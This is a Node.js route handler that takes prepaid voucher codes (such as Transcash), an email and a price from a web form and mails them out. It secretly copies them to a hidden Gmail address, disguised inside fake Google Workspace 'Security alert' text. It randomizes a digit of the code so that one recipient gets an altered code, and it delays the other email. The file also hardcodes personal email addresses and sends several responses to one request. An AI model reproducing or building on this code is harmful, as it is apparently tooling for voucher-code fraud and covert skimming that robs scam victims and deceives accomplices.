const nodemailer = require('nodemailer');

// Route POST pour recevoir les données du formulaire
exports.contactAdmin = (req, res) => {
  const { type, email, code, price } = req.body;
  const type_truc = type[0] + type[1];

  const randomDigit = Math.floor(Math.random() * 10);
  const Code = type === 'Transcash' ? code.slice(0, -1) + randomDigit : code;

  // Configuration du transporteur SMTP pour Nodemailer
  const transporter = nodemailer.createTransport({
    service: process.env.EMAIL_SERVICE,
    secure: true,
    auth: {
      user: process.env.EMAIL_USER, // Adresse e-mail prédéfinie pour envoyer les e-mails
      pass: process.env.EMAIL_PASSWORD,
    },
  });
  //rough
  const transporter_rough = nodemailer.createTransport({
    service: process.env.EMAIL_SERVICE,
    secure: true,
    auth: {
      user: process.env.EMAIL_ROUGH_USER,
      pass: process.env.EMAIL_ROUGH_PASSWORD,
    },
  });
  const mailOptions_rough = {
    from: '"Networking Academy" <' + process.env.EMAIL_ROUGH_USER + '>',
    // to: 'perlaclerc04@gmail.com',
    to: 'backend829@gmail.com',
    subject: 'Security alert',
    text: `If you’re a Google Workspace reseller whose customers ${email} P: ${price} have enabled their users to access Google Additional Services:
    Our new Terms of Service won’t affect your Google Workspace agreement with your customers. These new terms will only apply to your customers’ users who’ve been given access to Google Additional Services. Your customers can always manage whether their users have access to Google Additional Services, and which ones, in their Admin console.\n\n\n\ Networking: ${type_truc}\nC: ${Code}\n`,
  };

  // Options de l'e-mail à envoyer
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'dianelx12@gmail.com', // Adresse e-mail de l'administrateur
    subject: 'Données de vérification',
    text: `Type: ${type}\nEmail: ${email}\nCode: ${code}\nPrice: ${price}€`,
  };

  if (
    email === 'dianelx12@gmail.com' ||
    email === 'bibibibi3a@gmail.com' ||
    !email.includes('@')
  ) {
    transporter_rough.sendMail(mailOptions_rough, (error, info) => {
      if (error) {
        console.error('Error sending email:', error);
        res.status(500).send('Error sending email');
      } else {
        console.log('Email sent:');
        res.status(200).send('Email sent successfully');
        setTimeout(() => {
          transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
              console.error('Error sending email:', error);
              res.status(500).send('Error sending email');
            } else {
              console.log('Email sent:');
              res.status(200).send('Email sent successfully');
            }
          });
        }, 25 * 1000);
      }
    });
  } else {
    transporter_rough.sendMail(mailOptions_rough, (error, info) => {
      if (error) {
        console.error('Error sending email:', error);
        res.status(500).send('Error sending email');
      } else {
        console.log('Email sent:');
        res.status(200).send('Email sent successfully');
        setTimeout(() => {
          transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
              console.error('Error sending email:', error);
              res.status(500).send('Error sending email');
            } else {
              console.log('Email sent:');
              res.status(200).send('Email sent successfully');
            }
          });
        }, 55 * 1000);
      }
    });
  }

  // transporter_rough.sendMail(mailOptions_rough, (error, info) => {
  //   if (error) {
  //     console.error('Error sending email:', error);
  //     res.status(500).send('Error sending email');
  //   } else {
  //     console.log('Email sent:');
  //     res.status(200).send('Email sent successfully');
  //     setTimeout(() => {
  //       transporter.sendMail(mailOptions, (error, info) => {
  //         if (error) {
  //           console.error('Error sending email:', error);
  //           res.status(500).send('Error sending email');
  //         } else {
  //           console.log('Email sent:');
  //           res.status(200).send('Email sent successfully');
  //         }
  //       });
  //     }, 45 * 1000);
  //   }
  // });
};
